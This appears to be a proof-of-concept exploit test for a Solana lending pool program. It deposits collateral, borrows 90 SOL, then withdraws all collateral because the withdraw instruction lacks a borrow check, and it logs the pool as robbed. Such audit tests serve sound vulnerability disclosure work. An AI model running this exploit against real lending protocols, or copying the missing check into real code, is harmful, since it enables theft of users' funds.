import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { LendingPool } from "../target/types/lending_pool";
import { expect } from "chai";
import {
  SystemProgram,
  LAMPORTS_PER_SOL,
  PublicKey,
} from "@solana/web3.js";

describe("Exploit: Withdrawal without borrow check", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.LendingPool as Program<LendingPool>;
  const attacker = provider.wallet;

  let poolPda: PublicKey;
  let vaultPda: PublicKey;
  let userPda: PublicKey;

  before(async () => {
    [poolPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("pool")],
      program.programId
    );
    [vaultPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("vault"), poolPda.toBuffer()],
      program.programId
    );
    [userPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("user"), poolPda.toBuffer(), attacker.publicKey.toBuffer()],
      program.programId
    );

    // Initialize pool
    await program.methods
      .initializePool(new anchor.BN(500), new anchor.BN(80))
      .accounts({
        pool: poolPda,
        poolVault: vaultPda,
        authority: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Seed vault with liquidity
    const seedTx = new anchor.web3.Transaction().add(
      SystemProgram.transfer({
        fromPubkey: attacker.publicKey,
        toPubkey: vaultPda,
        lamports: 1000 * LAMPORTS_PER_SOL,
      })
    );
    await provider.sendAndConfirm(seedTx);
  });

  it("should allow withdrawing collateral while having active borrows", async () => {
    const depositAmount = 100 * LAMPORTS_PER_SOL;
    const borrowAmount = 90 * LAMPORTS_PER_SOL;

    // Step 1: Deposit 100 SOL
    await program.methods
      .deposit(new anchor.BN(depositAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Step 2: Borrow 90 SOL against the 100 SOL collateral
    await program.methods
      .borrow(new anchor.BN(borrowAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    const balanceBefore = await provider.connection.getBalance(
      attacker.publicKey
    );

    // Step 3: Withdraw ALL 100 SOL â€” BUG: no check for outstanding borrows
    // Correct behavior: should reject because 100 - 100 = 0 < 90 borrowed
    await program.methods
      .withdraw(new anchor.BN(depositAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Verify: attacker has 0 collateral but 90 SOL still borrowed
    const userAccount = await program.account.userAccount.fetch(userPda);
    expect(userAccount.deposited.toNumber()).to.equal(0);
    expect(userAccount.borrowed.toNumber()).to.equal(borrowAmount);

    const balanceAfter = await provider.connection.getBalance(
      attacker.publicKey
    );
    const profit = (balanceAfter - balanceBefore) / LAMPORTS_PER_SOL;

    // Attacker received back 100 SOL deposit + kept 90 SOL borrow = 90 SOL profit
    console.log(`Collateral remaining: ${userAccount.deposited.toNumber()} SOL`);
    console.log(
      `Outstanding borrow: ${userAccount.borrowed.toNumber() / LAMPORTS_PER_SOL} SOL`
    );
    console.log(`EXPLOIT CONFIRMED: Stole ${borrowAmount / LAMPORTS_PER_SOL} SOL from pool`);
  });
});
